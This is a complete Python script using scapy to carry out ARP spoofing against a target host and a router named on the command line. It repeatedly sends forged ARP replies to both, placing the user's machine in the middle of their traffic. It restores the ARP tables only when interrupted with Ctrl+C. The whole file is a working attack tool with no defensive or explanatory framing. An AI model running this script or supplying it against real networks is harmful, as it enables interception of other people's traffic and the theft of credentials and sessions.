import scapy.all as scapy
import time
import sys
import argparse



global ifce
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", default = "eth0" ,dest="interface", help="Interface to change mac")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_argument("-r", "--router", dest="router_ip", help="Target IP")
    options = parser.parse_args()
    if not options.target_ip or not options.router_ip:
        parser.error("Specify a IP address, use --help for info")
    return options

def get_mac(ip,interface):
    #scapy.arping(ip)
    
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_r_b = broadcast/arp_request
    ans = scapy.srp(arp_r_b,timeout=2,iface = interface,verbose=False,retry=5)[0]
    #print(ans.summary())
    return ans[0][1].hwsrc

def spoof(tip,sip):
    tmac = get_mac(tip,ifce)
    packet = scapy.ARP(op=2,pdst = tip ,hwdst = tmac , psrc=sip)
    scapy.send(packet,verbose=False)



def restore(dip,srip):
    tmac = get_mac(dip,ifce)
    smac = get_mac(srip,ifce)
    packet = scapy.ARP(op=2,pdst = dip ,hwdst = tmac , psrc=srip, hwsrc=smac)
    scapy.send(packet,verbose=False,count=4)


options = get_args()
target_ip = options.target_ip
router_ip = options.router_ip
ifce = options.interface
try:
    sc=0
    while True:
        spoof(target_ip,router_ip)
        spoof(router_ip,target_ip)
        sc+=2
        print("\r[+] Sent %s packets"%sc,end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL+C... restoring ARP tables")
    restore(target_ip,router_ip)
    restore(router_ip,target_ip)

